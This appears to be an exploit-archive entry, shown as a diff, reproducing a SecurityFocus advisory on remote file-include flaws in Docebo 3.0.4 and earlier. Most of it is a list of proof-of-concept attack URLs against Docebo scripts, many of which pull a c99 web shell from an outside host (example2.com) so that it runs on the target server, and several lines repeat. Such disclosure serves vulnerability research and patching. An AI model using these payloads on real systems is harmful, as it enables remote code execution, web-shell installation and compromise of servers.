@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/18109/info
+
+Docebo is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.
+
+Docebo versions 3.0.4 and prior are vulnerable to these issues.
+
+http://www.example.com/doceboCms/[dc_path]admin/modules/news/news_class.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/doceboCms/[dc_path]admin/modules/content/content_class.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/doceboCms/[dc_path]admin/modules/block_media/util.media.php?GLOBALS[where_cms]=[cmd_url]
+http://www.example.com/[dc_path]/addons/mod_media/body.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/[dc_path]/lib/lib.php?GLOBALS[where_framework]=[cmd_url]
+http://www.example.com/[dc_path]/class.module/class.definition.php?GLOBALS[where_lms]=[cmd_url]
+http://www.example.com/[dc_path]/modules/scorm/scorm_utils.php?GLOBALS[where_lms]=[cmd_url]
+http://www.example.com/lib/page_models/layout.1A.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.1B.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.1C.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.1D.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.2A.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.2B.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.2C.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.2D.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.3A.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.3B.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.3C.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.4D.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.4A.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.4B.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.4C.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.4D.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+http://www.example.com/lib/page_models/layout.Custom.php?GLOBALS[where_cms]=http://www.example2.com/c99shell.txt
+
+http://www.example.com/doceboLms/class/class.dashboard_lms.php?GLOBALS[where_framework]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.test.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.scorm.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.poll.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.link.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.item.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/class.module?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.glossary.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.faq.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.glossary.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.glossary.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
+http://www.example.com/doceboLms/class.module/track.glossary.php?GLOBALS[where_lms]=http://www.example2.com/c99shell.txt
